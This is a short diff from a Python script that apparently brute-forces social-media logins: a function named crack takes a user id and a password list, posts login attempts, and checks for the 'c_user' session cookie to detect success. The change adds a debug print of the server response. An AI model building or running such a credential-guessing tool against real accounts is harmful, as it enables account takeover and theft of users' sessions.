@@ -193,6 +193,7 @@ def crack(uid, password_list, total_count):
             'x-response-format': 'JSONStream',}           
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
+            print(respon.text)
             # Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
